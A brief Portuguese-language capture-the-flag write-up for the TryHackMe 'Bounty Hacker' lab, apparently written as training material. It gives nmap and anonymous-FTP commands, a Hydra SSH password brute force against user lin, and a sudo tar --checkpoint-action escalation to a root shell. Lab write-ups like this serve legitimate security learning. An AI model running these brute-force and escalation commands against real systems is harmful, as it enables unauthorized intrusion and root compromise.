Bounty Hacker

TryHackMe, Easy

Bounty Hacker parte de um FTP anônimo que vaza uma lista de senhas candidatas, usa o Hydra para autenticar por SSH e escala via sudo tar segundo o GTFOBins.

Reconhecimento

O Nmap revela FTP, SSH e HTTP. O FTP anônimo entrega locks.txt (lista de senhas candidatas) e task.txt assinado por lin, sugerindo o usuário.

nmap -sS -sV -Pn <IP>
ftp <IP>   # anonymous
get locks.txt
get task.txt

Foothold

Com a lista de senhas e o usuário lin, o Hydra recupera a credencial SSH.

hydra -l lin -P locks.txt ssh://<IP>
ssh lin@<IP>   # senha: <SENHA>

Escalação - sudo tar (GTFOBins)

O sudo -l mostra que lin pode rodar /bin/tar como root. Pelo GTFOBins, o tar executa um shell via --checkpoint-action.

sudo -l
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
cat /root/root.txt
